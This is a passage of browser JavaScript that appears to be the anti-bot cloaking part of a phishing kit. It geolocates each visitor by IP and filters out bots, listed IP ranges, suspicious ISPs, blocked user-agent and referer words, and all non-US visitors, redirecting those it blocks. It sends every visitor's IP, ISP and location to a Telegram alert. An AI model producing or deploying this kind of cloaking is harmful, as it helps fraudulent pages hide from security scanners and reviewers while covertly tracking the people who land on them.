        const ipData = await fetch(`https://ipinfo.io/${ip}?token=${apiKeys.ipinfoApiKey}`).then(res => res.json());
        const { city, region, country, org, postal, timezone } = ipData;

        const ipDetails = `IP: ${ip}, ISP: ${org}, ASN: ${ipData.asn}, City: ${city}, State: ${region}, Country: ${country}`;
        console.log(ipDetails); // Log IP details for debugging

        // Referer checks
        const refererBlocked = httpRefererChecks.find(check => referer.includes(check.referer));
        if (refererBlocked) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: ${refererBlocked.message}`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // IP range checks
        const rangeBlocked = ipRangeCheck.find(range => ipInRange(ip, range));
        if (rangeBlocked) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: ${rangeBlocked.message}`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if IP is in bad IPs list
        if (badIps.includes(ip)) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Listed in bad IPs.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if IP is from outside the USA
        if (country !== 'US') {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Non-US IP.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if user agent is in bad user agents list
        if (badUserAgents.some(ua => userAgent.includes(ua))) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Bad user agent.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if user agent is a known bot
        if (knownBots.some(bot => userAgent.includes(bot))) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Known bot.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if ISP is suspicious
        if (suspiciousIsps.some(suspiciousIsp => org.includes(suspiciousIsp))) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Suspicious ISP.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check if user agent contains blocked words
        if (blockedWords.some(word => userAgent.includes(word)) || blockedWords2.some(word2 => userAgent.includes(word2))) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Blocked words in User Agent.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // Check for blocked words in HTTP referer
        if (blockedWords.some(word => referer.includes(word)) || blockedWords2.some(word2 => referer.includes(word2))) {
            sendTelegramAlert(`Blocked ${ipDetails}, Reason: Blocked words in Referer.`);
            redirectTo(apiKeys.redirectUrl);
            return;
        }

        // If none of the conditions are met, log and alert about the allowed IP
        sendTelegramAlert(`Allowed ${ipDetails}, Reason: Passed all checks.`);
    }

    function redirectTo(url) {
        window.location.href = url;
    }

    checkIP();
});